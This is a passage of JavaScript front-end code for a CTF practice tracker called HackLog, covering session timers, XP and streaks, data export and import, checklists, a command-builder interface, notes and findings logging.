  if(t.timerRunning){t.timerAccumulated=getSecs(t);t.timerStartedAt=null;t.timerRunning=false;}
  else{t.timerStartedAt=Date.now();t.timerRunning=true;updateStreak();}
  save();
  const btn=E('pauseBtn'),sv=E('sessionTimerVal');
  if(btn){btn.textContent=t.timerRunning?'Pause':'Resume';btn.classList.toggle('paused',!t.timerRunning);}
  if(sv){sv.classList.toggle('paused',!t.timerRunning);}
}

function goActiveSession(){const r=targets.find(t=>t.timerRunning);if(r){showApp();selectTarget(r.id);}}

/* ═══════════════ STREAK / HEATMAP ════════════════ */
const getStreak=()=>parseInt(localStorage.getItem(K+'_str')||'0');
function updateStreak(){
  const today=new Date().toDateString(),last=localStorage.getItem(K+'_last')||'';
  if(last===today)return;
  const yesterday=new Date(Date.now()-86400000).toDateString();
  const s=getStreak();const ns=last===yesterday?s+1:1;
  localStorage.setItem(K+'_str',String(ns));localStorage.setItem(K+'_last',today);
}

/* ═══════════════ PROFILE ════════════════ */
const getProfile=()=>{try{return JSON.parse(localStorage.getItem(K+'_pf')||'{}')}catch{return{}}};
function saveProfile(){
  const h=E('pf-handle')?.value.trim();const tg=E('pf-tag')?.value.trim();
  const pf=getProfile();if(h)pf.handle=h;if(tg)pf.tagline=tg;
  localStorage.setItem(K+'_pf',JSON.stringify(pf));
  closeModal('modalProfile');renderProfile();toast('Profile saved');
}

function renderProfile(){
  const pf=getProfile();
  const handle=pf.handle||'Hacker';
  const tag=pf.tagline||'Welcome to HackLog — your personal CTF companion.';
  const av=E('profileAvatar'),ph=E('profileHandle'),pt=E('profileTag');
  if(av)av.childNodes[0].nodeValue=handle.slice(0,2).toUpperCase();
  if(ph)ph.textContent=handle;if(pt)pt.textContent=tag;
  const hEl=E('pf-handle'),tEl=E('pf-tag');
  if(hEl)hEl.value=pf.handle||'';if(tEl)tEl.value=pf.tagline||'';

  const st=getStats();const xp=getXP();const{l,pct,nxt,title}=getLvl(xp);
  const h=Math.floor(st.secs/3600),m=Math.floor((st.secs%3600)/60);
  E('kpi-time').textContent=h>0?`${h}h`:`${m}m`;
  E('kpi-time-sub').textContent=`${fmtTSh(st.secs)||'0m'} total hacking`;
  E('kpi-pwned').textContent=st.pwned;
  const streak=getStreak();
  E('kpi-pwned-sub').textContent=streak>0?`${streak} day streak`:'No active streak';
  E('kpi-flags').textContent=st.flags;
  E('kpi-flags-sub').textContent=`${st.userFlags} user · ${st.rootFlags} root`;
  const rate=targets.length?Math.round((st.pwned/targets.length)*100)+'%':'—';
  E('kpi-rate').textContent=rate;
  const pwned=targets.filter(t=>t.completed);
  const avg=pwned.length?Math.round(pwned.reduce((s,t)=>s+getSecs(t),0)/pwned.length):0;
  E('kpi-rate-sub').textContent=`avg: ${avg?fmtTSh(avg):'—'}`;

  // Level ring
  const circ=2*Math.PI*32;
  const lf=E('lcFill');
  if(lf){lf.style.strokeDasharray=circ;lf.style.strokeDashoffset=circ*(1-pct/100);}
  E('lcNum').textContent=l;E('lvlMain').textContent=`Level ${l}`;
  E('lvlTitle').textContent=title;E('lvlXpBar').style.width=pct+'%';
  E('lvlXpCur').textContent=`${xp} XP`;E('lvlXpNext').textContent=`${nxt-xp} to next`;

  // Diff bars
  const diffs=['easy','medium','hard','insane'];
  const mx=Math.max(1,...diffs.map(d=>targets.filter(t=>t.difficulty===d).length));
  diffs.forEach(d=>{
    const k=d==='medium'?'med':d;
    const cnt=targets.filter(t=>t.difficulty===d).length;
    E(`diff-${k}`).style.width=(cnt/mx*100)+'%';E(`diff-${k}-v`).textContent=cnt;
  });

  buildHeatmap();
  buildSessionList();
  renderAvatar();
  buildWeeklyProgress();
  buildActivityGraph();
  buildSkillGrid();
}

function buildSessionList(){
  const el=E('sessionList');if(!el)return;
  if(!targets.length){
    el.innerHTML=`<div class="sessions-empty"><svg viewBox="0 0 24 24" style="width:36px;height:36px;stroke:var(--t3);fill:none;stroke-width:1.3;stroke-linecap:round;display:block;margin:0 auto 12px"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="3" y1="9" x2="21" y2="9"/><line x1="9" y1="21" x2="9" y2="9"/></svg>No sessions yet.<br>Click <strong>New Session</strong> to start tracking your first CTF.</div>`;
    return;
  }
  const sorted=[...targets].sort((a,b)=>getSecs(b)-getSecs(a));
  el.innerHTML=sorted.map(t=>{
    const{pct}=progress(t);const secs=getSecs(t);
    const dotClass=t.completed?'dot-done':t.timerRunning?'dot-live':'dot-paused';
    const statusTxt=t.timerRunning?'Live':t.completed?'Pwned':'Paused';
    const statusColor=t.timerRunning?'var(--green)':t.completed?'var(--purple)':'var(--t3)';
    return`<div class="session-row" onclick="openSess('${t.id}')">
      <div class="session-status-dot ${dotClass}"></div>
      <div style="flex:1;min-width:0">
        <div class="sr-name">${esc(t.name)} <span class="badge badge-${t.difficulty}" style="margin-left:6px">${t.difficulty}</span></div>
        <div class="sr-meta">${esc(t.ip||'—')} · ${esc(t.os)} · ${pct}% complete</div>
        <div style="height:3px;background:var(--border);border-radius:3px;margin-top:6px;overflow:hidden"><div style="height:100%;background:var(--accent);width:${pct}%;border-radius:3px;transition:width .5s"></div></div>
      </div>
      <div class="sr-right">
        <div class="sr-time">${secs?fmtTSh(secs):'—'}</div>
        <div class="sr-status${t.timerRunning?' live':''}" style="color:${statusColor}">${statusTxt}</div>
      </div>
    </div>`;
  }).join('');
}

/* ═══════════════ VIEW ROUTING ═══════════ */
function hideAllViews(){
  E('profileView').classList.remove('active');
  E('appView').style.display='none';E('appView').classList.remove('active');
  E('studyView').style.display='none';E('studyView').classList.remove('active');
}
function showProfile(){
  hideAllViews();
  E('profileView').classList.add('active');
  E('navCrumb').textContent='Dashboard';renderProfile();
}
function showApp(){
  hideAllViews();
  E('appView').style.display='flex';E('appView').classList.add('active');
}
const goProfile=showProfile;
function openSess(id){showApp();selectTarget(id);}

/* ═══════════════ DATA MANAGEMENT ════════════ */
function exportData(){
  const USER_KEYS=[
    K+'_targets',K+'_hm',K+'_pf',K+'_xp',K+'_ach',
    K+'_blogs',K+'_sheets',K+'_writeups',K+'_theme'
  ];
  const data={version:1,exportedAt:new Date().toISOString(),store:{}};
  USER_KEYS.forEach(k=>{const v=localStorage.getItem(k);if(v!=null)data.store[k]=v;});
  const blob=new Blob([JSON.stringify(data,null,2)],{type:'application/json'});
  const url=URL.createObjectURL(blob);
  const a=document.createElement('a');
  a.href=url;a.download=`hacklog-backup-${new Date().toISOString().slice(0,10)}.json`;
  a.click();URL.revokeObjectURL(url);
  toast('Data exported successfully');
}
function importData(input){
  const file=input.files[0];if(!file)return;
  const reader=new FileReader();
  reader.onload=e=>{
    try{
      const data=JSON.parse(e.target.result);
      if(!data.store)throw new Error('Invalid backup file');
      Object.entries(data.store).forEach(([k,v])=>localStorage.setItem(k,v));
      input.value='';
      toast('Data imported — reloading...');
      setTimeout(()=>location.reload(),800);
    }catch(err){toast('Import failed: '+err.message);}
  };
  reader.readAsText(file);
}
function confirmDeleteData(){
  if(!confirm('Delete ALL your data? This cannot be undone.\n\nDefault sheets and blog posts will come back on next load. Your sessions, writeups, and progress will be gone.'))return;
  const USER_KEYS=[
    K+'_targets',K+'_hm',K+'_pf',K+'_xp',K+'_ach',
    K+'_blogs',K+'_sheets',K+'_writeups'
  ];
  USER_KEYS.forEach(k=>localStorage.removeItem(k));
  toast('All data deleted');
  setTimeout(()=>location.reload(),800);
}

/* ═══════════════ MODAL ══════════════════ */
function openModal(id){const el=E(id);el.style.display='flex';rAF(()=>rAF(()=>el.classList.add('open')));}
function closeModal(id){const el=E(id);el.classList.remove('open');el.addEventListener('transitionend',()=>{el.style.display='none'},{once:true});}

/* ═══════════════ SIDEBAR ════════════════ */
function renderSidebar(){
  const el=E('targetList');
  if(!targets.length){el.innerHTML='<div style="padding:14px;font-size:13px;color:var(--t3);text-align:center">No sessions yet</div>';E('sbFooter').style.display='none';return;}
  el.innerHTML=targets.map(t=>{
    const{pct}=progress(t);const secs=getSecs(t);
    const statusClass=t.completed?'done':t.timerRunning?'live':'paused';
    const statusTxt=t.timerRunning?'● Live':t.completed?'Pwned':`${pct}%`;
    return`<div class="tc${t.id===activeId?' active':''}${t.completed?' done':''}" onclick="selectTarget('${t.id}')">
      <button class="tc-del" onclick="event.stopPropagation();confDel('${t.id}')">${IC.trash}</button>
      <div class="tc-name">${esc(t.name)}</div>
      <div class="tc-ip">${esc(t.ip||'—')} · ${esc(t.difficulty)}</div>
      <div class="tc-foot">
        <span class="tc-status ${statusClass}">${statusTxt}</span>
        ${secs?`<span class="tc-time">${fmtTSh(secs)}</span>`:''}
      </div>
      <div class="tc-bar"><div class="tc-bar-fill" style="width:${pct}%"></div></div>
    </div>`;
  }).join('');
  const st=getStats();
  E('sbFooter').style.display='block';E('ss-total').textContent=st.targets;E('ss-flags').textContent=st.flags;E('ss-pwned').textContent=st.pwned;
}

/* ═══════════════ SELECT TARGET ════════════════ */
function selectTarget(id){
  activeId=id;noteIdx=null;clTypeFilter=null;aiMessages=[];
  E('emptyState').style.display='none';E('workspace').style.display='flex';
  renderSidebar();
  const t=getT();
  E('targetChip').textContent=`${t.name}`;
  E('navCrumb').textContent=t.name;
  updatePwnBanner(t);updateSessBar(t);
  if(t.timerRunning&&!t.timerStartedAt){t.timerStartedAt=Date.now();save();}
  renderTab();
}

function updatePwnBanner(t){
  const b=E('pwnBanner'),bt=E('pwnTime');
  if(t.completed){b.style.display='flex';bt.textContent=t.completedAt?'Completed '+new Date(t.completedAt).toLocaleString():''}
  else b.style.display='none';
}
function updateSessBar(t){
  const bar=E('sessionBar');if(!bar)return;
  if(t.completed){bar.style.display='none';return;}
  bar.style.display='flex';
  E('sessionTimerVal').textContent=fmtT(getSecs(t));
  const btn=E('pauseBtn');if(btn){btn.textContent=t.timerRunning?'Pause':'Resume';btn.classList.toggle('paused',!t.timerRunning);}
  const d=E('sbDate');if(d)d.textContent=t.timerStartedAt?new Date(t.timerStartedAt).toLocaleDateString([],{month:'short',day:'numeric'}):'';
}

/* ═══════════════ TABS ════════════════════ */
function switchTab(tab,btn){
  if(activeTab===tab)return;activeTab=tab;
  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
  if(btn)btn.classList.add('active');
  const el=E('tabContent');
  if(tab==='notes'){el.className='tab-content notes-mode';}
  else if(tab==='ai'){el.className='tab-content ai-mode';}
  else{el.className='tab-content';}
  renderTab();
}
function renderTab(){
  const t=getT();if(!t)return;
  const el=E('tabContent');
  const wrap=document.createElement('div');wrap.className='panel-enter';
  if(activeTab==='notes'){wrap.style.cssText='flex:1;overflow:hidden;display:flex;flex-direction:column;height:100%';wrap.innerHTML=buildNotes(t)}
  else if(activeTab==='commands')wrap.innerHTML=buildCommands();
  else if(activeTab==='overview')wrap.innerHTML=buildOverview(t);
  else if(activeTab==='checklist')wrap.innerHTML=buildChecklist(t);
  else if(activeTab==='findings')wrap.innerHTML=buildFindings(t);
  else if(activeTab==='ai')wrap.innerHTML=buildAiTab(t);
  el.innerHTML='';el.appendChild(wrap);
  if(activeTab==='commands'&&selCmd)setTimeout(rebuildCmd,0);
  if(activeTab==='overview'){const{pct}=progress(t);setTimeout(()=>{const b=E('mainBar');if(b)b.style.width=pct+'%';PHASES.forEach(ph=>{const pd=ph.items.filter(it=>(t.checks||{})[it.id]).length;const pp=Math.round(pd/ph.items.length*100);const fb=E('ph-fill-'+ph.id);if(fb)fb.style.width=pp+'%'})},80);}
}

/* ═══════════════ OVERVIEW ═══════════════ */
function buildOverview(t){
  const{tot,done,pct}=progress(t);
  const flags=(t.findings||[]).filter(f=>f.type.startsWith('flag')).length;
  const secs=getSecs(t);
  const phRows=PHASES.map(ph=>{
    const pd=ph.items.filter(it=>(t.checks||{})[it.id]).length;
    return`<div class="phase-row">
      <div class="phase-icon" style="background:${ph.color}1a;color:${ph.color}">${IC[ph.icon]||IC.search}</div>
      <div class="phase-name">${ph.name}</div>
      <div class="phase-track"><div class="phase-fill" id="ph-fill-${ph.id}" style="width:0%;background:${ph.color}"></div></div>
      <div class="phase-count">${pd}/${ph.items.length}</div>
    </div>`;
  }).join('');
  const isDone=t.completed;
  return`<div class="ov-wrap">
  <div class="ov-grid">
    <div class="ov-stat">
      <div class="ov-stat-val" style="color:var(--accent)">${done}</div>
      <div class="ov-stat-label">Steps Completed</div>
      <div class="ov-stat-sub">of ${tot} total</div>
    </div>
    <div class="ov-stat">
      <div class="ov-stat-val" style="color:var(--green)">${fmtTSh(secs)||'—'}</div>
      <div class="ov-stat-label">Session Time</div>
      <div class="ov-stat-sub">${t.timerRunning?'Running now':'Paused'}</div>
    </div>
    <div class="ov-stat">
      <div class="ov-stat-val" style="color:var(--amber)">${flags}</div>
      <div class="ov-stat-label">Flags Captured</div>
      <div class="ov-stat-sub">${(t.findings||[]).length} total findings</div>
    </div>
  </div>

  <div class="progress-card">
    <div class="pc-title">Attack Progress — ${pct}%</div>
    <div class="pc-sub">How far through the kill chain are you?</div>
    <div class="pc-overall"><div class="pc-overall-fill" id="mainBar" style="width:0%"></div></div>
    ${phRows}
  </div>

  <div class="qa-row">
    <button class="qa-btn" onclick="switchTab('checklist',document.querySelectorAll('.tab-btn')[1])">
      <div class="qa-btn-icon" style="background:var(--accentbg);color:var(--accent)">${IC.check}</div>
      <span class="qa-btn-label">Steps Checklist</span>
      <span class="qa-btn-sub">${tot-done} steps remaining</span>
    </button>
    <button class="qa-btn" onclick="openModal('modalFinding')">
      <div class="qa-btn-icon" style="background:var(--amberbg);color:var(--amber)">${IC.flag}</div>
      <span class="qa-btn-label">Log a Finding</span>
      <span class="qa-btn-sub">Flags, creds, vulnerabilities</span>
    </button>
    <button class="qa-btn" onclick="switchTab('notes',document.querySelectorAll('.tab-btn')[3]);setTimeout(newNote,50)">
      <div class="qa-btn-icon" style="background:var(--greenbg);color:var(--green)">${IC.file}</div>
      <span class="qa-btn-label">New Note</span>
      <span class="qa-btn-sub">${(t.notes||[]).length} notes saved</span>
    </button>
  </div>

  <button class="complete-btn${isDone?' done-mode':''}" onclick="toggleComplete()">
    ${IC.check}
    ${isDone?'Undo — Mark as Not Pwned':'Mark as Pwned'}
  </button>

  ${t.desc?`<div class="desc-card"><div class="desc-card-label">Mission Brief</div>${esc(t.desc)}</div>`:''}
  </div>`;
}

/* ═══════════════ PWNED ANIMATION ════════════════ */
function showPwnAnimation(targetName){
  const overlay=E('pwnOverlay');
  const skull=
'             uu$$$$$$$$$$$uu\n'+
'          uu$$$$$$$$$$$$$$$$$uu\n'+
'         u$$$$$$$$$$$$$$$$$$$$$u\n'+
'        u$$$$$$$$$$$$$$$$$$$$$$$u\n'+
'       u$$$$$$$$$$$$$$$$$$$$$$$$$u\n'+
'       u$$$$$$"   "$$$"   "$$$$$$u\n'+
'       *$$$$"      u$u       $$$$*\n'+
'        $$$u       u$u       u$$$\n'+
'        $$$u      u$$$u      u$$$\n'+
'         *$$$$uu$$$   $$$uu$$$$*\n'+
'          *$$$$$$$"   "*$$$$$$$*\n'+
'            u$$$$$$$u$$$$$$$u\n'+
'             u$"$"$"$"$"$"$u\n'+
'  uuu        $$u$ $ $ $ $u$$       uuu\n'+
'  u$$$$       $$$$$u$u$u$$$       u$$$$\n'+
'  $$$$$uu      "*$$$$$$$$$*"     uu$$$$$$\n'+
' u$$$$$$$$$$$uu    "*****"    uuuu$$$$$$$$$\n'+
' $$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*\n'+
'  ***      **$$$$$$$$$$$uu **$***\n'+
'           uuuu **$$$$$$$$$$uuu\n'+
'  u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$\n'+
'  $$$$$$$$$$****           **$$$$$$$$$$$*\n'+
'    *$$$$$*                      **$$$$**\n'+
'      $$$*                         $$$$*';

  overlay.innerHTML=
    '<div class="pwn-skull">'+skull+'</div>'+
    '<div class="pwn-title">SOLVED</div>'+
    '<div class="pwn-subtitle">'+esc(targetName||'TARGET')+' // COMPLETED</div>'+
    '<div class="pwn-divider">════════════════════════════════</div>'+
    '<div class="pwn-details">flag captured — '+esc(targetName||'target')+'</div>';

  overlay.classList.add('show');
  overlay.style.display='flex';
  overlay.style.animation='none';
  void overlay.offsetWidth;
  overlay.style.animation='pwn-fade-out 2s ease forwards';
  setTimeout(()=>{overlay.classList.remove('show');overlay.style.display='none';},2000);
}

/* ═══════════════ COMPLETION GUARD ════════════════ */
// Prevent XP farming by tracking if pwned XP was already awarded
function toggleComplete(){
  const t=getT();if(!t)return;
  t.completed=!t.completed;t.completedAt=t.completed?Date.now():null;
  if(t.completed){
    t.timerAccumulated=getSecs(t);t.timerStartedAt=null;t.timerRunning=false;
    // Only grant XP if not already granted for this target
    if(!t.pwnXpGranted){t.pwnXpGranted=true;grantXP(100,'session solved');updateStreak();checkAch();}
    showPwnAnimation(t.name);
  } else {
    // Undo completion — do NOT grant XP again on re-pwn
    toast('Completion cleared');
  }
  save();renderSidebar();updatePwnBanner(t);updateSessBar(t);renderTab();
}

/* ═══════════════ CHECKLIST ══════════════ */
function buildParserBlock(phId){
  const cfg=PARSERS[phId];if(!cfg)return'';
  const s=phaseOutputs[phId]||{raw:'',html:''};
  return`<div class="parser-section">
    <div class="parser-label">${IC.search} Auto-Parse Tool Output</div>
    <div style="font-size:12px;color:var(--t3);margin-bottom:8px">${esc(cfg.label)}</div>
    <textarea class="parser-textarea" id="op-${phId}" placeholder="Paste raw tool output here...">${esc(s.raw)}</textarea>
    <div class="parser-actions">
      <button class="btn btn-primary btn-xs" onclick="runParser('${phId}')">Parse Output</button>
      ${s.raw?`<button class="btn btn-ghost btn-xs" onclick="clearParser('${phId}')">Clear</button>`:''}
    </div>
    ${s.html?`<div class="parser-results">${s.html}</div>`:''}
  </div>`;
}
function runParser(phId){
  const ta=E('op-'+phId);if(!ta)return;
  const raw=ta.value.trim();if(!raw){toast('Paste some output first');return}
  const html=PARSERS[phId].parse(raw);
  phaseOutputs[phId]={raw,html};
  const wrap=ta.closest('.parser-section');
  if(wrap){
    const a=wrap.querySelector('.parser-actions');if(a)a.innerHTML=`<button class="btn btn-primary btn-xs" onclick="runParser('${phId}')">Parse Output</button><button class="btn btn-ghost btn-xs" onclick="clearParser('${phId}')">Clear</button>`;
    let res=wrap.querySelector('.parser-results');if(!res){res=document.createElement('div');res.className='parser-results';wrap.appendChild(res)}
    res.innerHTML=html;res.scrollIntoView({behavior:'smooth',block:'nearest'});
  }
  toast('Parsed successfully');
}
function clearParser(phId){
  phaseOutputs[phId]={raw:'',html:''};
  const ta=E('op-'+phId);if(ta)ta.value='';
  const wrap=ta?.closest('.parser-section');
  if(wrap){const r=wrap.querySelector('.parser-results');if(r)r.remove();const a=wrap.querySelector('.parser-actions');if(a)a.innerHTML=`<button class="btn btn-primary btn-xs" onclick="runParser('${phId}')">Parse Output</button>`}
}

function buildCheckItem(it, chkObj, noteObj, isType){
  const chk=!!(chkObj||{})[it.id];const note=(noteObj||{})[it.id]||'';const hn=!!note.trim();
  const prefix=isType?'tci-':'ci-';const notePrefix=isType?'tne-':'ne-';
  const toggleFn=isType?`toggleTypeCheck('${it.id}')`:      `toggleCheck('${it.id}')`;
  const noteSaveFn=isType?`saveTypeChkNote('${it.id}',this.value)`:`saveChkNote('${it.id}',this.value)`;
  const noteToggleFn=isType?`toggleNote('${it.id}','t')`:   `toggleNote('${it.id}')`;
  return`<div class="check-item${chk?' done':''}" id="${prefix}${it.id}">
    <div class="check-row" onclick="${toggleFn}">
      <div class="chk">${IC.check}</div>
      <div class="chk-body">
        <div class="chk-label">${esc(it.text)}</div>
        <div class="chk-hint">${esc(it.hint)}</div>
        <div class="tool-tags">${(it.tools||[]).map(to=>`<span class="tool-tag">${esc(to)}</span>`).join('')}</div>
      </div>
      <button class="note-btn${hn?' has':''}" onclick="event.stopPropagation();${noteToggleFn}">
        ${IC.file} ${hn?'Has Note':'Add Note'}
      </button>
    </div>
    <div class="note-exp" id="${notePrefix}${it.id}"><div class="ne-inner"><div class="ne-pad">
      <span class="ne-label">Your Notes</span>
      <textarea placeholder="Commands used, output, results..." oninput="${noteSaveFn}">${esc(note)}</textarea>
    </div></div></div>
  </div>`;
}
function togglePhase(id){E('pt-'+id)?.classList.toggle('open');E('pb-'+id)?.classList.toggle('open');}
function toggleCheck(id){
  const t=getT();if(!t.checks)t.checks={};t.checks[id]=!t.checks[id];save();renderSidebar();
  const item=E('ci-'+id);if(item){item.classList.toggle('done',t.checks[id]);}
  const ph=PHASES.find(p=>p.items.find(it=>it.id===id));
  if(ph){const d=ph.items.filter(it=>(t.checks||{})[it.id]).length;const c=document.querySelector(`#pt-${ph.id} .ph-ct`);if(c){c.textContent=`${d}/${ph.items.length}`;c.style.color=d===ph.items.length?'var(--green)':'var(--t3)';}}
  if(t.checks[id]){grantXP(5);checkAch();}
}
function toggleNote(id,prefix){const pfx=prefix?'tne-':'ne-';const ne=E(pfx+id);if(!ne)return;const open=ne.classList.toggle('open');if(open)setTimeout(()=>{const ta=ne.querySelector('textarea');if(ta){ta.focus();ta.setSelectionRange(ta.value.length,ta.value.length)}},240);}
function saveChkNote(id,val){
  const t=getT();if(!t.checkNotes)t.checkNotes={};t.checkNotes[id]=val;save();
  const row=E('ci-'+id);if(row){const btn=row.querySelector('.note-btn');const has=!!val.trim();if(btn){btn.classList.toggle('has',has);btn.innerHTML=`${IC.file} ${has?'Has Note':'Add Note'}`;}}
}
function toggleTypeCheck(id){
  const t=getT();if(!t.typeChecks)t.typeChecks={};t.typeChecks[id]=!t.typeChecks[id];save();renderSidebar();
  const item=E('tci-'+id);if(item){item.classList.toggle('done',t.typeChecks[id]);}
  const activeType=clTypeFilter||(t.type&&TYPE_CHECKLISTS[t.type]?t.type:null);
  if(activeType&&TYPE_CHECKLISTS[activeType]){
    const tc=TYPE_CHECKLISTS[activeType];
    const d=tc.items.filter(it=>(t.typeChecks||{})[it.id]).length;
    const c=document.querySelector('#pt-type .ph-ct');
    if(c){c.textContent=`${d}/${tc.items.length}`;c.style.color=d===tc.items.length?'var(--green)':'var(--t3)';}
  }
  if(t.typeChecks[id]){grantXP(5);checkAch();}
}
function saveTypeChkNote(id,val){
  const t=getT();if(!t.checkNotes)t.checkNotes={};t.checkNotes[id]=val;save();
  const row=E('tci-'+id);if(row){const btn=row.querySelector('.note-btn');const has=!!val.trim();if(btn){btn.classList.toggle('has',has);btn.innerHTML=`${IC.file} ${has?'Has Note':'Add Note'}`;}}
}

/* ═══════════════ COMMANDS ════════════════ */
function buildCommands(){
  const list=COMMANDS.map(c=>`<button class="cmd-tool-btn${selCmd===c.id?' sel':''}" onclick="pickCmd('${c.id}')"><div class="ctb-name">${c.name}</div><div class="ctb-desc">${c.desc}</div></button>`).join('');
  return`<div class="cmd-layout"><div class="cmd-tool-list">${list}</div><div class="cmd-panel">${buildCmdPanel()}</div></div>`;
}
function buildCmdPanel(){
  if(!selCmd)return`<div class="cmd-empty"><div style="text-align:center;color:var(--t3)"><div style="margin-bottom:8px">${IC.search}</div>Select a tool from the left to build your command</div></div>`;
  const tool=COMMANDS.find(c=>c.id===selCmd);const t=getT();
  const params=tool.params.map(p=>`<div class="p-grp"><label>${p.label}</label>${p.type==='sel'?`<select id="cp-${p.id}" onchange="rebuildCmd()">${p.opts.map(o=>`<option${o===p.def?' selected':''}>${o}</option>`).join('')}</select>`:`<input type="text" id="cp-${p.id}" placeholder="${esc(p.placeholder||'')}" value="${p.id==='target'&&t?.ip?t.ip:''}" oninput="rebuildCmd()" autocomplete="off">`}</div>`).join('');
  const flags=tool.flags.length?`<div><div class="cmd-sec">Optional Flags</div><div class="flags-row">${tool.flags.map(f=>`<div class="flag-tag" onclick="this.classList.toggle('on');rebuildCmd()">${esc(f)}</div>`).join('')}</div></div>`:'';
  return`<div>
    <div><div class="cmd-sec">Parameters</div><div class="params-grid">${params}</div></div>
    ${flags}
    <div class="cmd-out-wrap">
      <div class="cmd-sec">Generated Command</div>
      <div class="cmd-out"><span id="cmdOut" style="color:var(--green)"></span></div>
      <button class="copy-btn" onclick="copyCmd()">Copy</button>
    </div>
    ${tool.tip?`<div class="cmd-tip"><div class="cmd-tip-label">${IC.lightbulb} Tip</div>${esc(tool.tip)}</div>`:''}
  </div>`;
}
function pickCmd(id){if(selCmd===id)return;selCmd=id;const panel=document.querySelector('.cmd-panel');if(panel){panel.innerHTML=buildCmdPanel();setTimeout(rebuildCmd,0);}document.querySelectorAll('.cmd-tool-btn').forEach(b=>{b.classList.toggle('sel',b.querySelector('.ctb-name')?.textContent===COMMANDS.find(c=>c.id===id)?.name)});}
function rebuildCmd(){const tool=COMMANDS.find(c=>c.id===selCmd);if(!tool)return;const p={};tool.params.forEach(pa=>{const el=E('cp-'+pa.id);if(el)p[pa.id]=el.value;});const flags=Array.from(document.querySelectorAll('.flag-tag.on')).map(el=>el.textContent.split(' ')[0]);const out=E('cmdOut');if(out)out.textContent=tool.build(p,flags);}
function copyCmd(){const out=E('cmdOut');if(!out)return;navigator.clipboard.writeText(out.textContent).catch(()=>{});toast('Command copied to clipboard');}

/* ═══════════════ NOTES ════════════════════ */
function buildNotes(t){
  const items=(t.notes||[]).map((n,i)=>`<div class="note-item${noteIdx===i?' active':''}" onclick="selNote(${i})"><div class="ni-title">${esc(n.title||'Untitled')}</div><div class="ni-preview">${esc((n.body||'').slice(0,50))||'—'}</div></div>`);
  const listH=items.length?items.join(''):'<div style="padding:14px;font-size:13px;color:var(--t3)">No notes yet</div>';
  const note=(t.notes||[])[noteIdx];const cc=note?(note.body||'').length:0;
  const ts=note?.ts?new Date(note.ts).toLocaleString([],{dateStyle:'short',timeStyle:'short'}):'';
  const editor=note
    ?`<div class="ne-top-bar"><input class="ne-title-inp" id="nTitle" value="${esc(note.title||'')}" placeholder="Note title..."><button class="btn btn-danger btn-xs" onclick="delNote(${noteIdx})">Delete</button><button class="btn btn-primary btn-xs" onclick="saveNote()">Save</button></div>
       <div class="ne-meta"><span class="ne-ts">${ts?'Last edited '+ts:'New note'}</span><span style="font-size:12px;color:var(--t3)" id="nChars">${cc} chars</span></div>
       <textarea class="ne-body" id="nBody" placeholder="Write your notes, commands, findings..." oninput="E('nChars').textContent=this.value.length+' chars'">${esc(note.body||'')}</textarea>`
    :`<div class="ne-empty">${IC.file}<div style="font-size:14px;color:var(--t2);margin-top:8px">Select a note or create one</div></div>`;
  return`<div class="notes-layout" style="height:100%">
    <div class="notes-sidebar">
      <div class="notes-sidebar-head"><button class="btn btn-primary btn-sm" style="width:100%;justify-content:center" onclick="newNote()"><svg viewBox="0 0 24 24" style="width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg> New Note</button></div>
      <div class="notes-list">${listH}</div>
    </div>
    <div class="note-editor">${editor}</div>
  </div>`;
}
function selNote(i){noteIdx=i;renderTab();setTimeout(()=>{const el=E('nBody');if(el)el.focus()},60);}
function newNote(){const t=getT();if(!t.notes)t.notes=[];t.notes.unshift({title:'',body:'',ts:Date.now()});noteIdx=0;save();renderTab();setTimeout(()=>{const el=E('nTitle');if(el){el.focus();el.select()}},60);grantXP(10,'note created');}
function saveNote(){const t=getT();const ti=E('nTitle');const bi=E('nBody');if(!ti||!bi||noteIdx===null)return;t.notes[noteIdx]={title:ti.value||'Untitled',body:bi.value,ts:Date.now()};save();renderTab();toast('Note saved');checkAch();}
function delNote(i){const t=getT();t.notes.splice(i,1);noteIdx=null;save();renderTab();toast('Note deleted');}

/* ═══════════════ FINDINGS ════════════════ */
const FI_ICON={flag_user:'flag',flag_root:'flag',creds:'key',hash:'hash',vuln:'zap',port:'radio',note:'file'};
const FI_LBL={flag_user:'User Flag',flag_root:'Root Flag',creds:'Credentials',hash:'Hash',vuln:'Vulnerability',port:'Port/Service',note:'Other'};
const FI_COLOR={flag_user:'#fbbf24',flag_root:'#a78bfa',creds:'#34d399',hash:'#f87171',vuln:'#f87171',port:'#5b8def',note:'#8b95a8'};
function buildFindings(t){
  const byType={flag_user:[],flag_root:[],creds:[],hash:[],vuln:[],port:[],note:[]};
  (t.findings||[]).forEach((f,i)=>{(byType[f.type]||byType.note).push({...f,_i:i})});
  const order=['flag_user','flag_root','creds','hash','vuln','port','note'];
  const cards=order.flatMap(type=>byType[type].map(f=>{
    const color=FI_COLOR[f.type]||'var(--t3)';
    return`<div class="fi-card">
      <div class="fi-type-icon" style="background:${color}1a;color:${color}">${IC[FI_ICON[f.type]]||IC.file}</div>
      <div class="fi-body">
        <div class="fi-meta"><span class="fi-type-label">${FI_LBL[f.type]||f.type}</span><span class="sev sev-${f.severity}">${f.severity}</span><span class="fi-time">${esc(f.time||'')}</span></div>
        <div class="fi-val">${esc(f.value)}</div>
        ${f.ctx?`<div class="fi-ctx">${esc(f.ctx)}</div>`:''}
      </div>
      <button class="fi-del" onclick="delFinding(${f._i})" title="Delete">${IC.trash}</button>
    </div>`;
  })).join('');
  const fc=(t.findings||[]).filter(f=>f.type.startsWith('flag')).length;
  return`<div class="fi-wrap"><div class="fi-header">
    <div class="fi-title-group">
      <div class="fi-title">Findings</div>
      <div class="fi-sub">${(t.findings||[]).length} total · ${fc} flag${fc!==1?'s':''}</div>
    </div>
    <button class="btn btn-primary btn-sm" onclick="openModal('modalFinding')">
      <svg viewBox="0 0 24 24" style="width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
      Log Finding
    </button>
  </div>
  <div class="findings-grid">${cards||`<div class="fi-empty">${IC.search}<br>No findings yet.<br>Use <strong>Log Finding</strong> to record flags, credentials, and vulnerabilities.</div>`}</div></div>`;
}
